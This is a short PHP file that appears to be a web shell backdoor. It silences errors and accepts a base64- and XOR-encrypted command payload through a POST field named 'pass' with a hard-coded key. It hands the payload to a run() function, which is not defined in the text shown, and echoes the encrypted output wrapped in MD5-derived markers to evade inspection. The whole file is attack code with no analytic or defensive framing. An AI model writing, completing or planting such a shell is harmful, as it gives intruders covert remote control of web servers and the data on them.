<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);

function encode($data, $key) {
    for ($i = 0; $i < strlen($data); $i++) {
        $c = $key[$i + 1 & 15];
        $data[$i] = $data[$i] ^ $c;
    }
    return $data;
}

$pass = 'pass';
$key = '3c6e0b8a9c15224a';

if (isset($_POST[$pass])) {
    $data = encode(base64_decode($_POST[$pass]), $key);
    $result = run($data);
    echo substr(md5($pass . $key), 0, 16);
    echo base64_encode(encode($result, $key));
    echo substr(md5($pass . $key), 16);
}
